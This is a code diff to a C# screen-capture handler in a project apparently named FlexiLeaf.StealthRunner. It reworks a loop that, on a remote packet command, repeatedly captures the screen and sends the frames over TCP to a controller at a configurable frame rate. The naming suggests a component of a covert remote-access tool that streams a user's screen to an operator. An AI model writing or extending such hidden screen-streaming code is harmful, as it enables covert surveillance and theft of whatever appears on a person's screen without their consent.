@@ -1,37 +1,68 @@
 ﻿using FlexiLeaf.Core.Network;
 using FlexiLeaf.Core.Network.Packets;
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace FlexiLeaf.StealthRunner.Handlers
 {
-    internal class ScreenHandlers
+    public static class ScreenHandlers
     {
-        static bool SendUpdateScreen = false;
+        private static ScreenPacket ScreenPacket { get; set; } = new ScreenPacket(false, 0, 0);
+        private static CancellationTokenSource cts = new();
+        private static readonly object _lock = new();
+        static ScreenHandlers()
+        {
+            Task.Run(async () =>
+            {
+                while (true)
+                {
+                    
+                    while (ScreenPacket.ShowScreen && !cts.Token.IsCancellationRequested)
+                    {
+                        lock (_lock)
+                        {
+                            ScreenPacket.TakeScreen();
+                            TcpClient.Instance.Send(ScreenPacket);
+                        }
+
+                    if (ScreenPacket.FrameRate > 0)
+                        {
+                            var delayTime = 1000 / ScreenPacket.FrameRate;
+                            await Task.Delay(delayTime);
+                        }
+                    }
+
+                    try
+                    {
+                        await Task.Delay(Timeout.Infinite, cts.Token);
+                    }
+                    catch (TaskCanceledException)
+                    {
+                    }
+                }
+
+            });
+        }
 
         [PacketHandler]
         public static void ShowScreen(ScreenPacket packet, TcpClient Client)
         {
-            SendUpdateScreen = packet.ShowScreen;
-            if (packet.ShowScreen == true)
+            lock(_lock)
             {
-                ShowScreen(Client);
+                if (ScreenPacket.ShowScreen != packet.ShowScreen)
+                {
+                    if (packet.ShowScreen)
+                    {
+                        cts = new CancellationTokenSource();
+                    }
+                    else
+                    {
+                        cts.Cancel();
+                    }
+                }
+                ScreenPacket = packet;
             }
         }
-        private static void ShowScreen(TcpClient Client)
-        {
-            Task.Run(async () =>
-            {
-                while (SendUpdateScreen)
-                {
-                    await Client.Send(ScreenPacket.TakeScreen());
-                    await Task.Delay(30);
-                }
-            });
-        }
-
     }
 }
